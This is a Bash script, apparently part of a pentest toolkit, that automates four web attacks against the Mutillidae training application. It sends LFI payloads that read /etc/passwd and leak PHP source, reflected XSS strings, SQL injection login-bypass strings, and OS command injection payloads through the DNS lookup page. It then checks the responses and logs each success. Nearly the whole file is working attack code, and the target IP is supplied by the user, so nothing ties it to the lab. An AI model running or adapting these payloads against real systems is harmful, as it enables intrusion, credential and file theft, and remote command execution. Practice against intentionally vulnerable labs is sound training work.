#!/bin/bash
# modules/labs/mutillidae/exploits.sh - Exploits Mutillidae (4 essentiels)

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/mutillidae_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# 1. LFI (Local File Inclusion)
# ==========================

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Mutillidae - LFI]${NC}"
    echo -e "${CYAN}üìñ Objectif : Lecture fichiers sensibles${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Information disclosure${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Whitelist, chroot${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://${IP}:${PORT}/mutillidae"
    
    local payloads=(
        "../../../../etc/passwd"
        "../../../../etc/hosts"
        "../../config.inc"
        "php://filter/convert.base64-encode/resource=index.php"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test LFI...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/index.php?page=${enc}"
        
        echo -e "${CYAN}Payload: ${payload:0:50}${NC}"
        
        local resp=$(curl -s --max-time 10 "$url" 2>/dev/null)
        
        if validate_response "$resp" "root:x:" "127.0.0.1" "localhost" "PD9waH"; then
            echo -e "${GREEN}‚úÖ LFI SUCCESS - Fichier expos√©${NC}"
            log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "LFI: ${payload:0:30}"
            
            echo "$resp" | grep -E "root:|127\.0\.0\.1" | head -n 5
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Fichier non accessible${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 2. XSS
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Mutillidae - XSS]${NC}"
    echo -e "${CYAN}üìñ Objectif : XSS reflected${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Session hijacking${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Output encoding, CSP${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://${IP}:${PORT}/mutillidae"
    
    local payloads=(
        "$(generate_xss_payload basic)"
        "$(generate_xss_payload img)"
        "';alert(String.fromCharCode(88,83,83));//"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test XSS...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/index.php?page=user-info.php&username=${enc}"
        
        echo -e "${CYAN}Payload: ${payload:0:40}${NC}"
        
        local resp=$(curl -s --max-time 10 "$url" 2>/dev/null)
        
        if echo "$resp" | grep -qF "$payload"; then
            echo -e "${GREEN}‚úÖ XSS reflected${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: ${payload:0:30}"
        else
            echo -e "${YELLOW}‚ö†Ô∏è XSS bloqu√© ou encod√©${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 3. SQL Injection
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Mutillidae - SQL Injection]${NC}"
    echo -e "${CYAN}üìñ Objectif : SQLi via formulaire login${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Authentication bypass${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://${IP}:${PORT}/mutillidae"
    
    local payloads=(
        "' OR '1'='1"
        "' OR 1=1--"
        "admin'--"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test SQLi...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s --max-time 10 -X POST \
            "${BASE}/index.php?page=login.php" \
            -d "username=${payload}&password=x&login-php-submit-button=Login" \
            2>/dev/null)
        
        if validate_response "$resp" "logged in" "welcome" "home" "logout"; then
            echo -e "${GREEN}‚úÖ SQLi SUCCESS - Bypass auth${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi: $payload"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas de bypass √©vident${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 4. Command Injection
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Mutillidae - Command Injection]${NC}"
    echo -e "${CYAN}üìñ Objectif : Ex√©cution commandes OS${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : RCE${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Input validation${NC}"
    echo
    
    check_tools curl || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (8083): " PORT; PORT=${PORT:-8083}
    BASE="http://${IP}:${PORT}/mutillidae"
    
    local payloads=(
        ";id"
        "|whoami"
        "&&cat /etc/passwd"
        "\`uname -a\`"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test Command Injection...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "127.0.0.1${payload}")
        local url="${BASE}/index.php?page=dns-lookup.php&target_host=${enc}"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s --max-time 10 "$url" 2>/dev/null)
        
        if validate_response "$resp" "uid=" "root:" "Linux" "www-data"; then
            echo -e "${GREEN}‚úÖ Command Injection SUCCESS${NC}"
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "CmdInj: $payload"
            
            echo "$resp" | grep -E "uid=|root:|Linux" | head -n 5
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Pas d'ex√©cution d√©tect√©e${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# Menu
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== üí£ Exploits Mutillidae ===${NC}"
        echo
        echo -e "${GREEN}1) LFI (Local File Inclusion)${NC}"
        echo -e "${GREEN}2) XSS (Cross-Site Scripting)${NC}"
        echo -e "${GREEN}3) SQL Injection${NC}"
        echo -e "${GREEN}4) Command Injection${NC}"
        echo
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_lfi ;;
            2) exploit_xss ;;
            3) exploit_sqli ;;
            4) exploit_cmdinj ;;
            0) return ;;
            *)
                echo -e "${RED}‚ùå Invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
